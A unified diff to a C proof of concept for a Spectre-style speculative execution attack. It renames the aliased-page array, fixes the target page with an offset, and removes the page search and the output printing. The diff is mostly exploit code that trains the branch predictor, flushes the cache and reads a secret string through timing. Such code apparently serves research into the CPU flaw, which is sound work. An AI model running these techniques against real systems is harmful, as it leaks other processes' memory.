@@ -74,7 +74,7 @@ uint8_t unused2[64];
 uint8_t array2[256 * 512];
 int32_t big_block[4096];
 #define NUM_PAGES 1024
-volatile int32_t* alias[NUM_PAGES];
+volatile int32_t* load_addr[NUM_PAGES];
 volatile int32_t dropbag;
 
 char * secret_string       = "The Magic Words are Squeamish Ossifrage.";
@@ -149,7 +149,7 @@ static inline unsigned long array_index_mask_nospec(unsigned long index,
 }
 #endif
 
-void victim_function(size_t x, register volatile int32_t* dropbag, register volatile int32_t* alias) {
+void victim_function(size_t x, register volatile int32_t* dropbag, register volatile int32_t* load_addr) {
   if (x < array1_size) {
 #ifdef INTEL_MITIGATION
 		/*
@@ -166,7 +166,7 @@ void victim_function(size_t x, register volatile int32_t* dropbag, register vola
 #endif
     *dropbag = array1[x]+1;
   } else { *dropbag = 0; }
-  temp &= array2[(*(alias)-1) * 512];
+  temp &= array2[(*(load_addr)-1) * 512];
 }
 
 
@@ -224,10 +224,9 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
         flush_memory_sse( & array2[i * 512]);
 #endif
 
-    /* 6000 loops: 999 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
     uint64_t training_alias = (uint64_t)&dropbag;
-    uint64_t malicious_alias = (uint64_t)alias[pagenum];
+    uint64_t malicious_alias = (uint64_t)load_addr[pagenum];
     int32_t* alias_p;
     for (int k = 0; k < 500; k++) {
       for (j = 25-1; j >= 0; j--) {
@@ -240,7 +239,6 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 
         _mm_clflush( & array1_size);
         _mm_clflush( malicious_alias);
-        //madvise(malicious_alias & ~0xfff, 0x1000, MADV_DONTNEED);
 
         /* Delay (can also mfence) */
         for (volatile int z = 0; z < 400; z++) {}
@@ -380,13 +378,22 @@ int main(int argc,
   int32_t* mmap_base = mmap(NULL, 0x1000 * NUM_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 
   uint64_t alias_base = (uint64_t)mmap_base;
+  // touch all the pages
   for (i = 0; i < NUM_PAGES; i++) {
-    alias[i] = (int32_t*)((((uint64_t)&dropbag) & 0xfff) + (alias_base + i * 0x1000));
-    *(alias[i]) = 0xCC;
+    load_addr[i] = (int32_t*)((((uint64_t)&dropbag) & 0xfff) + (alias_base + i * 0x1000));
+    *(load_addr[i]) = 0xDD;
   }
-  printf("dropbag: %p\n  alias: %p\n   mmap: %p\n   diff: 0x%012x\n", &dropbag, alias[0], mmap_base, (uint64_t)alias[0] - (uint64_t)mmap_base);
 
-  //madvise((uint64_t)alias & ~0xfff, 0x1000, MADV_DONTNEED);
+  // always use the 4th page (arbitrarily chosen)
+  int pagenum = 4;
+
+  // offset so lower bits don't match
+  load_addr[pagenum] = (int32_t*)(((uint64_t)load_addr[pagenum]) + 37);
+
+  printf("dropbag: %p\n  load_addr: %p\n   mmap: %p\n   diff: 0x%012x\n", &dropbag, load_addr[4], mmap_base, (uint64_t)load_addr[pagenum] - (uint64_t)mmap_base);
+
+  // touch the chosen page again just to be sure
+  *(load_addr[pagenum]) = 0xCC;
 
   for (i = 0; i < (int)sizeof(array2); i++) {
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
@@ -448,23 +455,6 @@ int main(int argc,
   printf("\n");
 
   int results[256];
-  //int pagenum = -1;
-  int pagenum = 0;
-
-  /* Find the right physical page */
-  for (i = 0; i < NUM_PAGES; i++) {
-    readMemoryByte(cache_hit_threshold, malicious_x, value, score, results, i, 0);
-    // kind of cheating
-    if (results[secret[0]] > 0) {
-      pagenum = i;
-      printf("pagenum: %d\n", pagenum);
-      break;
-    }
-  }
-  if (pagenum == -1) {
-    printf("Couldn't find page\n");
-    exit(1);
-  }
 
   printf("Reading %d bytes:\n", len);
 
@@ -479,23 +469,8 @@ int main(int argc,
     */
     readMemoryByte(cache_hit_threshold, malicious_x++, value, score, results, pagenum, 1);
 
-    /* Display the results */
-    printf("%s: ", (score[0] >= 2 * score[1] ? "  Clear" : "Unclear"));
-    char guess = value[0] > 31 && value[0] < 127 ? value[0] : ' ';
-    printf("0x%02X=’%c’ score=%d ", value[0],
-      guess, score[0]);
-    best_guess[i] = guess;
-    
-    if (score[1] > 0) {
-      guess = value[1] > 31 && value[1] < 127 ? value[1] : ' ';
-      printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
-        guess, score[1]);
-      second_guess[i] = guess;
-    }
-
     i++;
     printf("\n");
   }
-  printf("Target: %s\n Guess: %s\n  2nds: %s\n", secret_string, best_guess, second_guess);
   return (0);
 }
